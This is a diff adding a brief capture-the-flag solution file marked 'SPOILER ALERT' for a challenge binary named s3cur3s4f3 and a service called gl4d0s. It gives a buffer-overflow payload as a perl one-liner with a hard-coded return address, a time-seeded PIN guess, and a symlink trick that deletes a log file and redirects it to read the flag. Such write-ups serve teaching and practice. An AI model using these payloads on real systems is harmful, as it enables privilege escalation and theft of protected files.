@@ -1,0 +1,9 @@
+SPOILER ALERT
+
+1. Escalate to another user / group through buffer overflow shit. (@JohnCramb)
+   i.  [srand(time(NULL)); (rand() % 10) 4 times]; ./s3cur3s4f3 == w00t w00t g0t p1n
+   ii. perl -e 'print "GODMODE\n4\nn\n" . "A"x96 . "\x85\x86\x04\x08"' | ./s3cur3s4f3
+2. Read the flag through a symlink vuln. (@cyphar)
+   i.   rm /var/log/gl4d0s/err.log; touch /var/log/gl4d0s/err.log
+   ii.  ln -s /../../../../../../../flag /var/run/gl4d0s/w00tw00t_bitch
+   iii. while true; do cat /var/log/gl4d0s/err.log; sleep 5; done
